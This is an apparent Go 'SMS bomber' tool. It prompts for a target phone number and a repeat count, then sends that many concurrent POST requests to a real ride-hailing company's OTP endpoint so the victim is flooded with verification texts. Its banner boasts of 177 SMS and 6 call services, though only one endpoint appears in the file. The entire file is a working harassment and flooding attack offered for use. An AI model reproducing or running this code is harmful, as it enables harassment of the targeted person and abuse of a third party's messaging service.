package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)


func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sms(url string, payload map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	time.Sleep(3 * time.Second)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData)) // تغییر به application/json
	time.Sleep(3 * time.Second)

	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.
                         .:   =#-:-----:
                           **%@#%@@@#*+==:
                       :=*%@@@@@@@@@@@@@@%#*=:
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:
             *@@%#            -@@@@@@.            #@@@+
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
              :@@*           =%@@@@@@%-   faster   *@@:
              #@@%         .*@@@@#%@@@%+.         %@@+
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
                      #@@@@@@@@@@@@@@@@@@@@@@+
                       *@@@@@@@@@@@@@@@@@@@@+
                        +@@%*@@%@@@%%@%*@@%=
                         +%+ %%.+@%:-@* *%-
                          .  %# .%#  %+
                             :.  %+  :.
                                 -:
`)
	fmt.Print("\033[0m")

	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
	}

	for i := 0; i < repeatCount; i++ {
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
